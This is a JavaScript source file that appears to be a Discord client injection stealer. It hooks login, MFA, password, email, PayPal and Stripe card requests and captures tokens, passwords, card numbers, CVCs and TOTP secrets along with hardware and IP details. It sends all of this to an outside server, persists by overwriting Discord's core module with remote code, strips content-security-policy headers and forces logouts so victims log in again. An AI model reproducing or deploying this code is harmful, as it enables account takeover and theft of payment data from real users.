const { BrowserWindow, session } = require('electron'),
    { execSync } = require("child_process"),
    { parse } = require("querystring"),
    path = require("path"),
    fs = require("fs");

let [ID, WEBHOOK] = ["%ID_REQUEST%", "%WEBHOOK%"];

const [LOGOUT_SCRIPT, TOKEN_SCRIPT, INJECT_URL] = ["window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\"get_require\"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b=\"string\"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})(\"login\").logout()}LogOut();", "for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]), gg.c) if (gg.c.hasOwnProperty(a)) { let b = gg.c[a].exports; if (b && b.__esModule && b.default) for (let a in b.default) 'getToken' == a && (token = b.default.getToken())} token;", "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js"];

function send(e, d) {
    return new Promise((resolve, reject) => {   
        const url = `https:\/\/aurita\.onrender\.com\/request\/${ID == "%ID" + "_REQUEST%" ? "k4itrun" : ID}\/${e}`.replace("\\", "");
        BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`fetch("${url}", ${JSON.stringify({
            method: 'POST',
            headers: {
                'Content-Type': 'text/plain',
                'Access-Control-Allow-Origin': '*',
                'authorization': WEBHOOK,
            },
            body: JSON.stringify(d),
        })})`).then(r => {
            if (r.ok) {
                resolve(r.json());
            }
        }).catch(e => {
            reject(e);
        });
    });
}

function cruise(a, b, c, d) {
    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`
          var xmlHttp = new XMLHttpRequest();
          xmlHttp.open("GET", "https://www.myexternalip.com/raw", false);
          xmlHttp.send(null);
          xmlHttp.responseText;
      `, true).then((ip) => {
        const RAW_DATA = {
            WIN_PRODUCT_VERSION: (execSync("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName").toString().split("\r\n")[0]),
            MAC_ADDRESS: (execSync("powershell.exe (Get-CimInstance -ClassName 'Win32_NetworkAdapter' -Filter 'NetConnectionStatus = 2').MACAddress").toString().split("\r\n")[0]),
            CPU_COUNT: (execSync("echo %NUMBER_OF_PROCESSORS%").toString().trim()),
            LOCAL_IP: (execSync("powershell.exe (Get-NetIPAddress).IPAddress").toString().split('\r\n')[0]),
            PC_NAME: (execSync("hostname").toString().trim()),
            INJECT: (__dirname.toString().trim().replace(/\\/g, "/")),
            UUID: (execSync("powershell.exe (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID").toString().split("\r\n")[0]),
            RAM: (parseInt(execSync('powershell "Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum | Select-Object -ExpandProperty Sum"', { encoding: 'utf-8' }).trim()) / (1024 * 1024 * 1024)).toFixed(2) + " GB",
            CPU: (execSync("wmic cpu get name | more +1").toString().replace(/\r\n/g, "").replace(/\r/g, "")),
            GPU: (execSync("wmic PATH Win32_VideoController get name | more +1").toString().replace(/\r\n/g, "").replace(/\r/g, "")),
            OS: (execSync("wmic OS get caption, osarchitecture | more +1").toString().trim()),
        };
        switch (a) {
            case 'LOGIN_USER':
                let x = {
                    IP: ip,
                    TYPE: d,
                    TOKEN: b,
                    ...RAW_DATA
                }
                if (c['code']) {
                    x.CODE = c['code']
                }
                send("login", x);
                break;
            case "USERNAME_CHANGED":
                send("username", {
                    IP: ip,
                    TOKEN: b,
                    PASSWORD: c['password'],
                    NEW_USERNAME: c['username'],
                    ...RAW_DATA
                });
                break;
            case 'EMAIL_CHANGED':
                send("email", {
                    IP: ip,
                    TOKEN: b,
                    PASSWORD: c['password'],
                    NEW_EMAIL: c['email'],
                    ...RAW_DATA
                });
                break;
            case 'PASSWORD_CHANGED':
                send("password", {
                    IP: ip,
                    TOKEN: b,
                    OLD_PASSWORD: c['password'],
                    NEW_PASSWORD: c['new_password'],
                    ...RAW_DATA
                });
                break;
            case 'CREDITCARD_ADDED':
                send("creditcard", {
                    IP: ip,
                    TOKEN: b,
                    NUMBER: c['card[number]'],
                    DATE: `${c['card[exp_month]']}:${c['card[exp_year]']}`,
                    CVC: c['card[cvc]'],
                    DATA: c,
                    ...RAW_DATA
                });
                break;
            case 'PAYPAL_ADDED':
                send("paypal", {
                    IP: ip,
                    TOKEN: b,
                    EMAIL: c['email'],
                    PASSWORD: c['password'],
                    NEW_PAYPAL: "done",
                    ...RAW_DATA
                });
                break;
            case 'MFA_ENABLED':
                send("mfae", {
                    IP: ip,
                    TOKEN: b,
                    PASSWORD: c['password'],
                    CODE: c['code'],
                    SECRET_KEY: c['secret'],
                    ...RAW_DATA
                });
                break;
            case "INJECTED":
                send("injected", {
                    IP: ip,
                    TOKEN: b,
                    ...RAW_DATA
                });
                break;
            default:
        }
    });
}

const DISCORD_PATH = (function () {
    const app = process.argv[0].split(path.sep).slice(0, -1).join(path.sep);
    let resource;
    if (process.platform === 'win32') {
        resource = path.join(app, 'resources');
    } else if (process.platform === 'darwin') {
        resource = path.join(app, 'Contents', 'Resources');
    }
    if (fs.existsSync(resource)) return { resource, app };
    return { undefined, undefined };
})();

async function updateCheck() {
    const { resource, app } = DISCORD_PATH;
    if (resource === undefined || app === undefined) return;
    let p = path.join(resource, 'app');
    if (!fs.existsSync(p)) fs.mkdirSync(p);
    if (fs.existsSync(path.join(p, 'package.json'))) fs.unlinkSync(path.join(p, 'package.json'));
    if (fs.existsSync(path.join(p, 'index.js'))) fs.unlinkSync(path.join(p, 'index.js'));
    if (process.platform === 'win32' || process.platform === 'darwin') {
        fs.writeFileSync(path.join(p, 'package.json'), JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));
        fs.writeFileSync(path.join(p, 'index.js'), `const fs = require('fs'), https = require('https');\nconst indexJs = '${`${app}\\modules\\${fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]}\\discord_desktop_core\\index.js`}';\nconst bdPath = '${path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar')}';\nconst K4ITRUN = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\n    if (K4ITRUN < 20000 || data === "module.exports = require('./core.asar')")\n        init();\n})\nasync function init() {\n    https.get('${INJECT_URL}', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace('%WEBHOOK%', '${WEBHOOK}')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n        \n    }).on("error", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('${path.join(resource, 'app.asar')}')\nif (fs.existsSync(bdPath)) require(bdPath);`.replace(/\\/g, '\\\\'));
    }
    if (!fs.existsSync(path.join(__dirname, 'initiation'))) return;
    fs.rmdirSync(path.join(__dirname, 'initiation'));

    // ALERT !!
    cruise('INJECTED', await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(TOKEN_SCRIPT, true));
    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(LOGOUT_SCRIPT, true);
}

session.defaultSession.webRequest.onBeforeRequest({
    'urls': [
        'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
        'https://*.discord.com/api/v*/applications/detectable',
        'https://discord.com/api/v*/applications/detectable',
        'https://*.discord.com/api/v*/users/@me/library',
        'https://discord.com/api/v*/users/@me/library',
        'https://*.discord.com/api/v*/users/@me/billing/subscriptions',
        'https://discord.com/api/v*/users/@me/billing/subscriptions',
        'wss://remote-auth-gateway.discord.gg/*',
        'https://discord.com/api/v*/auth/sessions',
        'https://*.discord.com/api/v*/auth/sessions',
        'https://discordapp.com/api/v*/auth/sessions'
    ]
}, (a, callback) => {
    if (!fs.existsSync(`${__dirname}/aurathemes`)) {
        fs.mkdirSync(`${__dirname}/aurathemes`);
    }
    if (!fs.existsSync(`${__dirname}/aurathemes/${ID}.txt`)) {
        fs.writeFileSync(`${__dirname}/aurathemes/${ID}.txt`, WEBHOOK);
        BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(LOGOUT_SCRIPT, true);
    }
    if (a.url.startsWith('wss://remote-auth-gateway') || a.url.endsWith("auth/sessions")) {
        callback({ cancel: true });
    } else {
        callback({ cancel: false });
    }
    updateCheck();
})

session.defaultSession.webRequest.onHeadersReceived((a, c) => {
    delete a.responseHeaders['content-security-policy'];
    delete a.responseHeaders['content-security-policy-report-only'];
    c({
        'responseHeaders': {
            ...a.responseHeaders,
            'Access-Control-Allow-Headers': '*'
        }
    });
});

session.defaultSession.webRequest.onCompleted({
    'urls': [
        'https://discord.com/api/v*/users/@me',
        'https://discordapp.com/api/v*/users/@me',
        'https://*.discord.com/api/v*/users/@me',
        "https://discord.com/api/v*/auth/mfa/totp",
        "https://discord.com/api/v*/users/@me/mfa/totp/disable",
        "https://discordapp.com/api/v*/users/@me/mfa/totp/disable",
        "https://*.discord.com/api/v*/users/@me/mfa/totp/disable",
        "https://canary.discord.com/api/v*/users/@me/mfa/totp/disable",
        "https://discord.com/api/v*/users/@me/mfa/totp/enable",
        "https://discordapp.com/api/v*/users/@me/mfa/totp/enable",
        "https://*.discord.com/api/v*/users/@me/mfa/totp/enable",
        "https://canary.discord.com/api/v*/users/@me/mfa/totp/enable",
        "https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
        "https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
        "https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
        "https://discord.com/api/v*/users/@me/billing/payment-sources/validate-billing-address",
        'https://discordapp.com/api/v*/auth/login',
        'https://discord.com/api/v*/auth/login',
        'https://*.discord.com/api/v*/auth/login',
        'https://discord.com/api/v*/auth/register',
        'https://api.stripe.com/v*/tokens',
    ]
}, async (a, callback) => {
    try {
        var data = JSON.parse(Buffer.from(a.uploadData[0].bytes).toString());
    } catch (err) {
        var data = parse(decodeURIComponent(a.uploadData[0].bytes.toString()));
    }
    let authorization = await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(TOKEN_SCRIPT, true)
    if (a.statusCode != 200) return;
    if (a.url.endsWith('/login')) {
        if (!authorization) return
        cruise('LOGIN_USER', authorization, data, "LOGGED IN");
    }
    if (a.url.endsWith('/register')) {
        cruise('LOGIN_USER', authorization, data, "SIGNED UP");
    }
    if (a.url.endsWith('/mfa/totp')) {
        cruise('LOGIN_USER', authorization, data, "LOGGED IN WITH MFA-2");
    }
    if (a.url.includes('/@me/mfa/totp/enable')) {
        cruise('MFA_ENABLED', authorization, data);
    }
    if (a.url.endsWith('/paypal/billing-agreement-tokens')) {
        cruise('PAYPAL_ADDED', authorization, data);
    }
    if (a.url.endsWith('/users/@me')) {
        if (a.method != 'PATCH') return;
        if (!data['password']) return;
        if (data['email']) {
            cruise('EMAIL_CHANGED', authorization, data);
        }
        if (data['new_password']) {
            cruise('PASSWORD_CHANGED', authorization, data);
        }
        if (data['username']) {
            cruise('USERNAME_CHANGED', authorization, data);
        }
    }
    if (a.url.includes('api.stripe.com')) {
        cruise('CREDITCARD_ADDED', authorization, data);
    }
}),

module.exports = require('./core.asar');
